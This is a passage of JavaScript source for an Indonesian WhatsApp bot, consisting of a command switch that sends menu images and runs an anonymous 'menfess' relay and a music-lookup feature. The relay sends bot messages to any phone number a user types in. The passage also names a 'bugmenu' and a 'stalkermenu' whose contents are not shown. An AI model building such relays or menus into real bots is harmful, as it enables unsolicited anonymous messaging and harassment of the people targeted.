      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/26pt2s.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
           case 'newupdatemenu': { 
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
let DinzID_sad = `${newupdate(prefix, hituet)}`  
TradzSigma.sendMessage(m.chat, {
image: fs.readFileSync('./library/data/image/thumb.jpg'),
gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/8na2ws.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'downloadmenu': { 
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
let DinzID_sad = `${downloadmenu(prefix, hituet)}`  
TradzSigma.sendMessage(m.chat, {
image: fs.readFileSync('./library/data/image/thumb.jpg'),
gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/8na2ws.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'confess': case 'confes': case 'menfes': case 'menfess': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    TradzSigma.menfes = TradzSigma.menfes ?? {};
    const session = Object.values(TradzSigma.menfes).find(v => v.state === 'CHATTING' && [v.a, v.b].includes(m.sender));
    if (session) {
        const target = session.a === m.sender ? session.b : session.a;
        await TradzSigma.sendMessage(target, {
            text: `📩 Pesan baru dari @${m.sender.split('@')[0]}:\n\n${m.text}`,
            mentions: [m.sender],
        });
        replyviex("Pesan diteruskan.");
        return;
    }
    const roof = Object.values(TradzSigma.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (roof) return replyviex("Kamu masih berada dalam sesi menfess");
    if (m.isGroup) return replyviex("Fitur hanya tersedia di private chat!");
    if (!text) return replyviex(`Kirim perintah ${prefix + command} nama|nomor|pesan\n\nContoh:\n${prefix + command} ${pushname}|628xxx|Menfess nih`);
    if (!text.includes('|')) return replyviex("Format salah! Gunakan format: nama|nomor|pesan");

    let [namaNya, nomorNya, pesanNya] = text.split('|');
    nomorNya = nomorNya.replace(/^0/, '62');
    if (isNaN(nomorNya)) return replyviex("Nomor tidak valid! Pastikan hanya menggunakan angka.");

    const yoi = `Hi ada menfess nih buat kamu\n\nDari: ${namaNya}\nPesan: ${pesanNya}\n\nKetik:\n${prefix}balasmenfess -- Untuk menerima menfess\n${prefix}tolakmenfess -- Untuk menolak menfess\n\n_Pesan ini dikirim oleh bot._`;
    const tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg');

    const id = m.sender;
    TradzSigma.menfes[id] = {
        id,
        a: m.sender,
        b: `${nomorNya}@s.whatsapp.net`,
        state: 'WAITING',
    };

    await TradzSigma.sendMessage(`${nomorNya}@s.whatsapp.net`, { image: tod, caption: yoi });
    replyviex("Pesan berhasil dikirim ke nomor tujuan. Semoga dibalas ya!");
}
break;
case 'balasmenfess': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    TradzSigma.menfes = TradzSigma.menfes ?? {};
    const roof = Object.values(TradzSigma.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return replyviex("Belum ada sesi menfess");

    const room = Object.values(TradzSigma.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
    if (!room) return replyviex("Tidak ada sesi menfess yang sedang menunggu");

    const other = [room.a, room.b].find(user => user !== m.sender);
    room.b = m.sender;
    room.state = 'CHATTING';
    TradzSigma.menfes[room.id] = { ...room };

    await TradzSigma.sendMessage(other, {
        text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini._\n\n*NOTE:* Ketik .stopmenfess untuk berhenti.`,
        mentions: [m.sender],
    });
    replyviex("Menfess diterima, sekarang kamu bisa chat!");
    replyviex("Silakan balas pesan langsung di chat ini. Semua pesan akan diteruskan.");
}
break;

case 'tolakmenfess': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    TradzSigma.menfes = TradzSigma.menfes ?? {};
    const roof = Object.values(TradzSigma.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return replyviex("Belum ada sesi menfess");

    const other = [roof.a, roof.b].find(user => user !== m.sender);
    await TradzSigma.sendMessage(other, {
        text: `_Maaf, @${m.sender.split("@")[0]} menolak menfess kamu._`,
        mentions: [m.sender],
    });
    replyviex("Menfess berhasil ditolak.");
    delete TradzSigma.menfes[roof.id];
}
break;
case 'stopmenfess': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    TradzSigma.menfes = TradzSigma.menfes ?? {};
    const find = Object.values(TradzSigma.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!find) return replyviex("Belum ada sesi menfess");

    const to = find.a === m.sender ? find.b : find.a;
    await TradzSigma.sendMessage(to, {
        text: "_Sesi menfess ini telah dihentikan._",
        mentions: [m.sender],
    });
    replyviex("Sesi menfess dihentikan.");
    delete TradzSigma.menfes[find.id];
}
break;
case 'carimusic':
case 'whatmusic': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  if (!/audio/.test(mime) && !/ogg/.test(mime)) return replyviex('Mohon kirimkan file audio atau .ogg!');

  let media = await TradzSigma.downloadAndSaveMediaMessage(quoted);
  TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})

  try {
    let url = await CatBox(media);
    let jr = await fetchJson(`https://linecloud.my.id/api/tools/whatmusic?url=${encodeURIComponent(url)}`);
    
    if (jr && Array.isArray(jr)) {
      let result = jr.map((item, index) => `
🎶 *${item.title}* - *${item.artist}*
*ʀɪʟɪs*: ${item.release}
*ᴅᴜʀᴀsɪ*: ${(item.duration / 1000).toFixed(2)} ᴅᴇᴛɪᴋ
*ʟɪɴᴋ*: 
  ${item.url.map((link, idx) => `${idx + 1}. ${link}`).join('\n')}
      `).join('\n\n');

      let buttons = jr.map((item, index) => ({
        "name": "quick_reply",
        "buttonParamsJson": `{"display_text":"ᴍᴀɪɴᴋᴀɴ sᴇᴋᴀʀᴀɴɢ ${item.title}","id":".play ${item.title}"}`
      }));

      buttons.push(...jr.map((item, index) => ({
        "name": "quick_reply",
        "buttonParamsJson": `{"display_text":"ɪɴғᴏ sᴇʟᴇɴɢᴋᴀᴘɴʏᴀ ${item.title}","id":".google ${item.title}"}`
      })));

      let search = await yts(jr[0].title);
      let uii = await search.all;
      let buffer = await getBuffer(uii[0].thumbnail);

      TradzSigma.sendButtonImage(m.chat, `\`Hasil Pencarian Musik\``, result, buffer, buttons, m);
    } else {
      replyviex('Gagal memproses pencarian musik. Coba lagi nanti!');
    }
  } catch (err) {
    console.error(err);
    replyviex('Terjadi kesalahan, silakan coba lagi nanti.');
  }

  await fs.unlinkSync(media);
}
break;

case 'groupmenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${groupmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/e7mb24.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break

case 'funmenu': { 
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${funmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/4vul7f.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'stalkermenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
let DinzID_sad = `${stalkermenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/mzyiup.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'randomphotomenu': {let DinzID_sad = `${randomphotomenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/yvipd5.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'randomvideomenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${randomvideomenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/vzw84x.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'ephoto360menu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${ephoto360menu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/b87noq.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'nsfwmenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${nsfwmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: `${global.thumbnail}`,
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'animemenu': {
  let DinzID_sad = `${animemenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: `${global.thumbnail}`,
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'primbonmenu': {
  let DinzID_sad = `${primbonmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/aqmjdn.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'beritamenu': {
  let DinzID_sad = `${beritamenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/7gallp.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'sertifikatmenu': {
  let DinzID_sad = `${sertifikatmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/k24q4w.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'stickermenu': {
   let DinzID_sad = `${stickermenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/1a2ms5.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'databasemenu': {
  let DinzID_sad = `${databasemenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/mhcye4.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'aimenu': {
   let DinzID_sad = `${aimenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/s8hkm6.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'bugmenu': {
  let DinzID_sad = `${bugmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/mhcye4.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'pyterodactylemenu': {
  let DinzID_sad = `${pyterodactylemenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/mhcye4.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
case 'mangkane1':
case 'mangkane2':
case 'mangkane3':
case 'mangkane4':
case 'mangkane5':
case 'mangkane6':
case 'mangkane7':
case 'mangkane8':
case 'mangkane9':
case 'mangkane10':
case 'mangkane11':
case 'mangkane12':
case 'mangkane13':
case 'mangkane14':
case 'mangkane15':
case 'mangkane16':
case 'mangkane17':
case 'mangkane18':
case 'mangkane19':
case 'mangkane20':
case 'mangkane21':
case 'mangkane22':
case 'mangkane23':
case 'mangkane24':
case 'mangkane25':
case 'mangkane26':
case 'mangkane27':
case 'mangkane28':
case 'mangkane29':
case 'mangkane30':
case 'mangkane31':
case 'mangkane32':
case 'mangkane33':
case 'mangkane34':
case 'mangkane35':
case 'mangkane36':
case 'mangkane37':
case 'mangkane38':
case 'mangkane39':
case 'mangkane40':
case 'mangkane41':
case 'mangkane42':
case 'mangkane43':
case 'mangkane44':
case 'mangkane45':
case 'mangkane46':
case 'mangkane47':
case 'mangkane48':
